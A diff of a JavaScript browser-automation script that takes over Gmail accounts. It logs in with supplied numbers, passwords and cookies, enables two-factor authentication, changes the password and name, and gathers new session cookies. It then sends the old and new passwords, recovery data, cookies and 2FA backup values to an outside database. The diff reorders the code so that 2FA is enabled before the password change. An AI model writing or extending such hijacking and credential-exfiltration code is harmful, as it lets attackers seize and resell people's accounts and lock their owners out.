@@ -337,12 +337,17 @@ async function loginWithCompleted(number, password, cookies, time, worker) {
                         rapt = await getRapt(await page.url())
 
                         if (rapt) mRapt = rapt
+
+                        let mTwoFa = await waitForTwoFaActive(page, mRapt)
+            
+                        console.log('Process: [ Two Fa: Enable '+((mTwoFa.auth || mTwoFa.backup) && !mTwoFa.error ? 'Success': 'Failed')+' --- Time: '+getTime()+' ]')
         
                         if (!mPassword) mPassword = await waitForPasswordChange(page, mRapt)
 
                         if(mPassword) {
+                            let n_cookies = await getNewCookies(await page.cookies())
                             try {
-                                await axios.patch(DATABASE_URL+'gmail/completed'+((mYear < 2019 || mMailYear < 2019? '_old':''))+'/'+mData.gmail.replace(/[.]/g, '')+'.json', JSON.stringify({ number:number, recovery: mRecovery, password:mPassword, old_pass:password, cookies:cookies, create: mYear, mail:mMailYear }), {
+                                await axios.patch(DATABASE_URL+'gmail/completed'+(mTwoFa.error ? '_error':(mYear < 2019 || mMailYear < 2019? '_old':''))+'/'+mData.gmail.replace(/[.]/g, '')+'.json', JSON.stringify({ number:number, recovery: mRecovery, password:mPassword, old_pass:password, cookies:cookies, n_cookies:n_cookies, create: mYear, mail:mMailYear, auth:mTwoFa.auth, backup:mTwoFa.backup }), {
                                     headers: {
                                         'Content-Type': 'application/x-www-form-urlencoded'
                                     }
@@ -363,11 +368,7 @@ async function loginWithCompleted(number, password, cookies, time, worker) {
             
                             await waitForNameChange(page, mRapt)
             
-                            let mTwoFa = await waitForTwoFaActive(page, mRapt)
-            
-                            console.log('Process: [ Two Fa: Enable '+((mTwoFa.auth || mTwoFa.backup) && !mTwoFa.error ? 'Success': 'Failed')+' --- Time: '+getTime()+' ]')
-
-                            let n_cookies = await getNewCookies(await page.cookies())
+                            n_cookies = await getNewCookies(await page.cookies())
                             
                             try {
                                 await axios.patch(DATABASE_URL+'gmail/completed'+(mTwoFa.error ? '_error':(mYear < 2019 || mMailYear < 2019? '_old':''))+'/'+mData.gmail.replace(/[.]/g, '')+'.json', JSON.stringify({ number:number, recovery: mRecovery, password:mPassword, old_pass:password, cookies:cookies, n_cookies:n_cookies, create: mYear, mail:mMailYear, auth:mTwoFa.auth, backup:mTwoFa.backup }), {
